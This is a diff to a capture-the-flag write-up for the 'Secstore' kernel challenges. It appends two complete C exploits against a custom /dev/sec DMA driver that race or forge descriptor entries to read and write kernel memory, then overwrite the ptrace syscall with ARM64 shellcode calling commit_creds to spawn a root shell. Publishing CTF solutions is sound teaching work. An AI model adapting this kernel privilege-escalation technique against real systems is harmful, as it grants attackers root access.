@@ -295,6 +295,8 @@ code
 
     SaF{so_easy_to_write_kernel_drivers_with_stackoverflow_https://stackoverflow.com/a/5540080}
 
+The full exploit is available at the bottom of this page.
+
 ## Secstore 2
 
 ### Trivial?
@@ -378,3 +380,224 @@ got super frustrated when my exploit stopped working and wound up passing out at
 Nevertheless, the flag was 
 
     SaF{Sometimes Science Is More Art Than Science}
+
+## Part 1 Exploit
+```c
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <pthread.h>
+#include <sys/mman.h>
+#include <stdio.h>
+#include <sys/ptrace.h>
+
+#define MAX_LLI 8
+struct lli{
+    uint64_t src;
+    uint64_t dst;
+    uint32_t size;
+    uint32_t ctrl;
+};
+#define PL666_LLI_MORE 0x0001
+#define PL666_LLI_READ 0x0002
+
+volatile uint64_t racer_run  = 0;
+struct racer_arg {
+    struct lli * arg;
+    uint64_t flag;
+};
+struct lli * buf = NULL;
+void * a   = NULL;
+
+void * racer(void * arg) {
+    struct racer_arg * targ = arg;
+    volatile struct lli * arg_buf = targ->arg;
+    while(1) {
+        printf("(Thread 2): Waiting\n");
+        while(!racer_run) {};
+        printf("(Thread 2): Running\n");
+        while(racer_run){
+            __atomic_store_n(&(arg_buf[0].ctrl), PL666_LLI_MORE, __ATOMIC_SEQ_CST);
+        }
+    }
+    printf("(Thread 2): Done racer\n");
+    return NULL; 
+}
+uint64_t read_kernel(int fd, uint64_t kaddr, uint64_t size) {
+    printf("(Thread 1): Read %p:%x\n", kaddr, size);    
+    //valid entry, will be read from user to hw
+    memset(buf, 0, sizeof(struct lli) * 4);
+    buf[0].src  = a;
+    buf[0].size = 0x10;
+    //forged entry (write from kaddr to hw)
+    buf[1].src  = kaddr;
+    buf[1].dst  = 0x100;
+    buf[1].size = size;
+    buf[1].ctrl = 0;
+    //do the race
+    racer_run = 1;
+    for(int i = 0; i < 16; i++) {
+      buf[0].src  = a;
+      write(fd, buf, sizeof(struct lli));
+    }
+    racer_run = 0;
+    //read out the resulting data
+    memset(a, 0x0, size);
+    buf[0].dst  = a;
+    buf[0].src  = 0x100;
+    buf[0].size = size;
+    read(fd, buf, sizeof(struct lli));
+    void * data = malloc(size);
+    memcpy(data, a, size);
+    return data;
+}
+void write_kernel(int fd, uint64_t kaddr, void * uaddr, uint64_t size){
+    printf("(Thread 1): Write %p:%x\n", kaddr, size);    
+    //populate hw with data to write:
+    memcpy(a, uaddr, size);
+    buf[0].src = a;
+    buf[0].dst = 0x1000;
+    buf[0].size = size;
+    write(fd, buf, sizeof(struct lli));
+    //valid entry, will be read from user to hw
+    memset(buf, 0, sizeof(struct lli) * 4);
+    buf[0].src  = a;
+    buf[0].size = 0x10;
+    //forged entry (write from hw to kaddr)
+    buf[1].src  = 0x1000;
+    buf[1].dst  = kaddr;
+    buf[1].size = size;
+    buf[1].ctrl = PL666_LLI_READ;
+    //do the race
+    racer_run = 1;
+    for(int i = 0; i < 16; i++) {
+        buf[0].src = a;
+        write(fd, buf, sizeof(struct lli));
+    }
+    racer_run = 0;
+    return;
+}
+
+int main() {
+    int secfd = open("/dev/sec", O_RDWR); 
+    buf = mmap((void*)0x10000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    a   = mmap((void*)0x20000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    pthread_t t;
+    struct racer_arg targ;
+    targ.arg = buf;
+    pthread_create(&t, NULL, racer, &targ);
+    uint64_t * kstack_leak = read_kernel(secfd, 0xffff800010003758, 16);
+    printf("##\t%p:%p (%p)\n",0xffff800010003758, kstack_leak[0], kstack_leak[0] - 0x8b8d38);
+    uint64_t kernel_base         = kstack_leak[0] - 0x8b8d38;
+    uint64_t prepare_kernel_cred = kernel_base + 0x696a8;
+    uint64_t commit_creds        = kernel_base + 0x693e0;
+    uint64_t __arm64_sys_ptrace  = kernel_base + 0x49c88;
+
+    uint64_t shellcode[0x200/8];
+    char * sc = "\xfd\x7b\xbe\xa9\xe9\x00\x00\x58\x00\x00\x80\xd2\x20\x01\x3f\xd6\xc9\x00\x00\x58\x20\x01\x3f\xd6\xfd\x7b\xc2\xa8\xc0\x03\x5f\xd6\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43";
+    memcpy(shellcode, sc, 0x100);
+    shellcode[4]  = prepare_kernel_cred;
+    shellcode[5]  = commit_creds;
+    
+    printf("Write shellcode...\n");
+    write_kernel(secfd, __arm64_sys_ptrace, shellcode, 0x200);
+    printf("Executing...\n");
+    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
+
+    system("/bin/sh");
+    return 0;
+}
+```
+
+## Part 2 Exploit
+```c
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <pthread.h>
+#include <sys/mman.h>
+#include <stdio.h>
+#include <sys/ptrace.h>
+
+#define MAX_LLI 8
+struct lli{
+    uint64_t src;
+    uint64_t dst;
+    uint32_t size;
+    uint32_t ctrl;
+};
+#define PL666_LLI_MORE 0x0001
+#define PL666_LLI_READ 0x0002
+
+struct lli * buf = NULL;
+void * a   = NULL;
+
+uint64_t read_kernel(int fd, uint64_t kaddr, uint64_t size) {
+    memset(buf, 0, sizeof(struct lli) * 4);
+    buf[0].src  = a;
+    buf[0].size = 0x10;
+    
+    buf[1].src  = kaddr;
+    buf[1].dst  = 0x100;
+    buf[1].size = size;
+	buf[1].ctrl = PL666_LLI_MORE;
+
+    write(fd, buf, sizeof(struct lli) * 2);
+    memset(a, 0x0, size);
+    buf[0].dst  = a;
+    buf[0].src  = 0x100;
+    buf[0].size = size;
+    read(fd, buf, sizeof(struct lli));
+    
+    void * data = malloc(size);
+    memcpy(data, a, size);
+    return data;
+}
+uint64_t write_kernel(int fd, uint64_t kaddr, void * uaddr, uint64_t size) {
+    memcpy(a, uaddr, size);
+    buf[0].src = a;
+    buf[0].dst = 0x1000;
+    buf[0].size = size;
+    write(fd, buf, sizeof(struct lli));    
+
+    memset(buf, 0, sizeof(struct lli) * 4);
+    buf[0].dst  = a;
+    buf[0].size = 0x10;
+	buf[1].dst  = kaddr;
+    buf[1].src  = 0x1000;
+    buf[1].size = size;
+	buf[1].ctrl = PL666_LLI_MORE;
+    return read(fd, buf, sizeof(struct lli) * 2);
+}
+int main() {
+    int secfd = open("/dev/sec", O_RDWR); 
+    char * nop[0x10];
+    buf = mmap((void*)0x10000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    a   = mmap((void*)0x20000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+    uint64_t* kstack_leak = read_kernel(secfd, 0xffff800010003ee8, 16);
+    printf("##\t%p:%p (%p)\n",0xffff800010003ee8, kstack_leak[0], kstack_leak[0] - 0xf11aa0);
+
+	uint64_t kernel_base =  kstack_leak[0] - 0xf11aa0;
+    uint64_t prepare_kernel_cred = kernel_base + 0x696a8;
+    uint64_t commit_creds        = kernel_base + 0x693e0;
+    uint64_t call_usermodehelper = kernel_base + 0x5a9a0;
+    uint64_t __arm64_sys_ptrace  = kernel_base + 0x49c88;
+
+    uint64_t shellcode[0x200/8];
+    char * sc = "\xfd\x7b\xbe\xa9\xe9\x00\x00\x58\x00\x00\x80\xd2\x20\x01\x3f\xd6\xc9\x00\x00\x58\x20\x01\x3f\xd6\xfd\x7b\xc2\xa8\xc0\x03\x5f\xd6\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43";
+    memcpy(shellcode, sc, 0x100);
+    shellcode[4]  = prepare_kernel_cred;
+    shellcode[5]  = commit_creds;
+    
+    printf("Write shellcode...\n");
+    write_kernel(secfd, __arm64_sys_ptrace, shellcode, 0x200);
+    
+    printf("Going to exec %p\n", __arm64_sys_ptrace);
+    read(0, nop, 1);
+    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
+
+    system("/bin/sh");
+    return 0;
+}
+```
